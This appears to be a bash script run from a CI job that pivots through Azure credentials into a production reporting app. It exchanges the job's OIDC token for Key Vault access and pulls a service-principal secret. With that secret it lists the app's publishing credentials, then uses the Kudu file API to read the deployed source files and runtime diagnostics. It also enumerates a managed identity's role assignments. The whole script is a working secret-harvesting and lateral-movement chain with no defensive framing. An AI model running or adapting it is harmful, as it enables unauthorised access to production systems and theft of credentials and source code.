#!/usr/bin/env bash
# reporting-service -> publishing creds -> Kudu VFS: read app-tbl-reporting-prod source + env (READ-ONLY).
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RRG="rg-tbl-reporting-prod-eus"; APPR="app-tbl-reporting-prod"; AUD="api://AzureADTokenExchange"
SCM="https://$APPR.scm.azurewebsites.net"
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
KVP=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
RS=$(curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r .value)
RA=$(echo "$RS"|jq -r .appId); RK=$(echo "$RS"|jq -r .clientSecret)
MG=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$RA" -d grant_type=client_credentials -d "client_secret=$RK" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)

echo "### publishing credentials"
curl -s -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RRG/providers/Microsoft.Web/sites/$APPR/config/publishingcredentials/list?api-version=2023-12-01" > /tmp/pc.json
U=$(jq -r '.properties.publishingUserName' /tmp/pc.json); P=$(jq -r '.properties.publishingPassword' /tmp/pc.json)
echo "user=$U passlen=${#P}"
BA=$(printf '%s:%s' "$U" "$P" | base64 | tr -d '\n')

echo "### Kudu: use AAD bearer too (fallback). Try VFS wwwroot listing"
# try AAD bearer first then basic
for AUTH in "Bearer $MG" "Basic $BA"; do
  echo "   -- auth: ${AUTH%% *} --"
  CODE=$(curl -s -o /tmp/vfs.json -w '%{http_code}' -H "Authorization: $AUTH" "$SCM/api/vfs/site/wwwroot/?recursive=false")
  echo "   vfs wwwroot -> $CODE"
  if [ "$CODE" = "200" ]; then
    jq -r '.[]? | .mime+"  "+.name+"  ("+(.size|tostring)+")"' /tmp/vfs.json 2>/dev/null || cat /tmp/vfs.json | head -c 500
    echo "   === reading files ==="
    for F in $(jq -r '.[]? | select(.mime!="inode/directory") | .name' /tmp/vfs.json 2>/dev/null); do
      echo "   ----- $F -----"
      curl -s -H "Authorization: $AUTH" "$SCM/api/vfs/site/wwwroot/$F" | head -c 2500; echo
    done
    echo "   === env via Kudu diagnostics (environment) ==="
    curl -s -H "Authorization: $AUTH" "$SCM/api/diagnostics/runtime" | head -c 300; echo
    break
  fi
done
echo "### UAMI f64d08c7 role assignments (reporting-service view):"
curl -s -H "Authorization: Bearer $MG" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'f64d08c7-fde6-4553-99c8-5bf73666ee8c'" | jq -r '.value[]? | "   role="+(.properties.roleDefinitionId|split("/")|last)+" scope="+.properties.scope, (.error.code//empty)'
echo "=== DONE ==="
